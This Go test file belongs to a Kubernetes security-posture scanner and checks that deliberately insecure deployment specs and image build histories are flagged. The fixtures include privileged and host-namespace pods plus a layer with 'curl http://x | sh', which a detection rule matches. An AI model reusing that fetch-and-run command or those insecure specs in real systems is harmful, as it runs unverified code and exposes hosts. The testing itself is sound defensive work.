package posture

import (
	"slices"
	"strings"
	"testing"
	"time"
)

const snapshotJSON = `{
  "deployments": [
    {"metadata": {"name": "api", "namespace": "shop", "annotations": {"container.apparmor.security.beta.kubernetes.io/api": "unconfined"}},
     "spec": {"template": {"spec": {
       "hostNetwork": true,
       "volumes": [{"name": "logs", "hostPath": {"path": "/var/log"}}, {"name": "data", "hostPath": {"path": "/data"}}],
       "containers": [{
         "name": "api", "image": "docker.io/shop/api:latest",
         "securityContext": {"privileged": true, "capabilities": {"drop": ["NET_RAW"]}},
         "ports": [{"containerPort": 8080, "hostPort": 80}],
         "volumeMounts": [{"name": "logs", "readOnly": true}, {"name": "data"}],
         "env": [{"name": "DB", "valueFrom": {"secretKeyRef": {"name": "db-creds", "key": "pw"}}}]
       }]}}}},
    {"metadata": {"name": "web", "namespace": "shop"},
     "spec": {"template": {"spec": {
       "serviceAccountName": "web", "automountServiceAccountToken": false,
       "securityContext": {"fsGroup": 1000},
       "containers": [{
         "name": "web", "image": "registry.local:5000/shop/web@sha256:abc",
         "securityContext": {"allowPrivilegeEscalation": false, "runAsNonRoot": true, "readOnlyRootFilesystem": true, "capabilities": {"drop": ["ALL"]}},
         "resources": {"limits": {"cpu": "500m", "memory": "256Mi"}, "requests": {"cpu": "100m", "memory": "128Mi"}}
       }]}}}}
  ],
  "daemon_sets": [
    {"metadata": {"name": "agent", "namespace": "kube-system"},
     "spec": {"template": {"spec": {"hostPID": true, "containers": [{"name": "agent", "image": "quay.io/agent:v1"}]}}}}
  ],
  "pods": [
    {"metadata": {"name": "api-1", "namespace": "shop"}, "spec": {"containers": [{"name": "api", "image": "docker.io/shop/api:latest"}]}},
    {"metadata": {"name": "web-1", "namespace": "shop"}, "spec": {"containers": [{"name": "web", "image": "registry.local:5000/shop/web@sha256:abc"}]}},
    {"metadata": {"name": "agent-1", "namespace": "kube-system"}, "spec": {"containers": [{"name": "agent", "image": "quay.io/agent:v1"}]}}
  ],
  "namespaces": [{"metadata": {"name": "shop"}}, {"metadata": {"name": "batch"}}, {"metadata": {"name": "kube-system"}}],
  "network_policies": [
    {"metadata": {"name": "open", "namespace": "shop"}, "spec": {"ingress": [{}], "egress": [{"to": [{"ipBlock": {"cidr": "10.0.0.0/8"}}]}]}}
  ],
  "services": [
    {"metadata": {"name": "api", "namespace": "shop"}, "spec": {"type": "NodePort"}},
    {"metadata": {"name": "dns", "namespace": "kube-system"}, "spec": {"type": "NodePort"}}
  ]
}`

var allChecks = []string{
	"no-privileged", "no-host-pid", "no-host-ipc", "no-host-net", "no-priv-esc", "no-root", "no-root-group",
	"drop-net-raw", "drop-all-caps", "no-seccomp-unconfined", "no-apparmor-unconfined", "readonly-root",
	"no-host-path", "no-host-path-write", "no-host-port", "resource-limits", "resource-requests", "no-latest-tag",
	"no-default-sa", "secret-as-env-rt", "ns-no-netpol-rt", "allow-all-ingress-rt", "allow-all-egress-rt", "nodeport-exposed-rt",
}

func key(f Finding) string { return f.Workload + "/" + f.Check }

func TestDeployChecks(t *testing.T) {
	snap, err := ParseSnapshot([]byte(snapshotJSON))
	if err != nil {
		t.Fatal(err)
	}
	ev := Evaluator{Cluster: "c1", Now: time.Date(2026, 10, 7, 12, 0, 0, 0, time.UTC)}
	got := ev.Deploy([]Policy{{ID: "p1", Name: "baseline", DetType: "Deploy", DeployChecks: allChecks}}, snap)
	keys := make([]string, 0, len(got))
	for _, f := range got {
		keys = append(keys, key(f))
	}
	slices.Sort(keys)

	want := []string{
		"agent/drop-all-caps", "agent/drop-net-raw", "agent/no-default-sa", "agent/no-host-pid", "agent/no-priv-esc",
		"agent/readonly-root", "agent/resource-limits", "agent/resource-requests",
		"api/drop-all-caps", "api/no-apparmor-unconfined", "api/no-default-sa", "api/no-host-net", "api/no-host-path",
		"api/no-host-path-write", "api/no-host-port", "api/no-latest-tag", "api/no-priv-esc", "api/no-privileged",
		"api/nodeport-exposed-rt", "api/readonly-root", "api/resource-limits", "api/resource-requests", "api/secret-as-env-rt",
		"batch/ns-no-netpol-rt", "open/allow-all-ingress-rt",
	}
	if !slices.Equal(keys, want) {
		t.Fatalf("deploy findings\n got %v\nwant %v", keys, want)
	}
	for _, f := range got {
		if !strings.HasPrefix(f.Fingerprint, "dep::c1::p1::") || !strings.HasSuffix(f.Fingerprint, "::20261007") || f.VType != "deploy" {
			t.Fatalf("fingerprint %q type %q", f.Fingerprint, f.VType)
		}
		if f.Check == "no-host-path-write" && !strings.Contains(f.Detail, `"data"`) {
			t.Fatalf("writable hostPath detail %q", f.Detail)
		}
	}

	scoped := ev.Deploy([]Policy{{ID: "p2", DetType: "Deploy", Namespace: "batch", DeployChecks: allChecks}}, snap)
	if len(scoped) != 1 || key(scoped[0]) != "batch/ns-no-netpol-rt" {
		t.Fatalf("namespace-scoped findings %+v", scoped)
	}
	off := false
	if len(ev.Deploy([]Policy{{ID: "p3", DetType: "Deploy", Enabled: &off, DeployChecks: allChecks}}, snap)) != 0 {
		t.Fatal("a disabled policy must not report")
	}
}

func TestBuildChecks(t *testing.T) {
	snap, err := ParseSnapshot([]byte(snapshotJSON))
	if err != nil {
		t.Fatal(err)
	}
	ev := Evaluator{Cluster: "c1", Now: time.Now()}
	histories := []History{
		{Image: "docker.io/shop/api:latest", Status: "done", Layers: []Layer{{CreatedBy: "/bin/sh -c #(nop) ADD file:abc in /"}, {CreatedBy: "/bin/sh -c curl http://x | sh"}}},
		{Image: "registry.local:5000/shop/web@sha256:abc", Status: "unavailable", Error: "401"},
		{Image: "quay.io/agent:v1", Status: "pending"},
	}
	policies := []Policy{
		{ID: "reg", Name: "registries", DetType: "Build", TrustedRegistries: "quay.io/, registry.local:5000/"},
		{ID: "curl", Name: "no curl pipe", DetType: "Build", BuildInstruction: "CURL http"},
		{ID: "ns", Name: "shop only", DetType: "Build", Namespace: "kube-system", TrustedRegistries: "registry.local:5000/"},
	}
	got := ev.Build(policies, snap, histories)
	var lines []string
	for _, f := range got {
		lines = append(lines, f.PolicyID+" "+f.BuildCheck+" "+f.Image)
	}
	slices.Sort(lines)
	want := []string{
		"curl history registry.local:5000/shop/web@sha256:abc",
		"curl layer docker.io/shop/api:latest",
		"ns registry quay.io/agent:v1",
		"reg registry docker.io/shop/api:latest",
	}
	if !slices.Equal(lines, want) {
		t.Fatalf("build findings\n got %v\nwant %v", lines, want)
	}
	for _, f := range got {
		if f.BuildCheck == "layer" && f.Detail != "Layer matches: RUN curl http://x | sh" {
			t.Fatalf("layer detail %q", f.Detail)
		}
		if f.BuildCheck == "history" && (!f.Pending || f.Action != "alert") {
			t.Fatalf("history finding %+v", f)
		}
	}
}

func TestLatestTag(t *testing.T) {
	for img, want := range map[string]bool{
		"nginx": true, "nginx:latest": true, "nginx:1.27": false, "registry:5000/app": true,
		"registry:5000/app:v2": false, "app@sha256:abc": false, "": true,
	} {
		if got := latestTag(img); got != want {
			t.Errorf("latestTag(%q) = %v, want %v", img, got, want)
		}
	}
}
